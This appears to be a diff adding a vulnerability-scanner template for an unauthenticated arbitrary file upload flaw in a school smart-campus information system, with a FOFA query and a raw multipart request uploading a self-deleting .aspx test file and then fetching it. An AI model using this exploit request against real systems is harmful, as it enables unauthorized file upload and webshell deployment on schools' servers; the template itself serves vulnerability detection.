@@ -1,0 +1,55 @@
+id: zhongxiaoxuezhihui-PSE_Upload-File-upload
+
+info:
+  name: "中小学智慧校园信息管理系统 接口任意文件上传漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/Login/IndexMobi"
+      中小学智慧校园信息管理系统在 /PSE/Upload 接口实现中未正确校验文件上传权限，攻击者可构造恶意请求绕过验证机制，向服务器写入任意类型文件。该缺陷允许未经授权的远程攻击者部署Webshell，通过代码执行能力实现对目标系统的持久化控制，最终导致服务器权限完全沦陷。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140611357
+  tags: 中小学智慧校园信息管理系统
+
+http:
+- raw:
+  - |
+    POST /PSE/Upload HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+    --00content0boundary00
+    Content-Disposition: form-data; name="file"; filename="test.aspx"
+    Content-Type: image/jpg
+
+    <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+    --00content0boundary00--
+
+  - |
+    GET /Upload/PrimarySchoolEnrollment/{{uploadfile}} HTTP/1.1
+    Host: {{Hostname}}
+
+  extractors:
+  - type: regex
+    part: body
+    name: uploadfile
+    group: 1
+    regex:
+    - '(\w+\d.+?\.aspx)'
+    internal: true
+
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'pboyjnnrfipmplsukdeczudsefxmywe'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
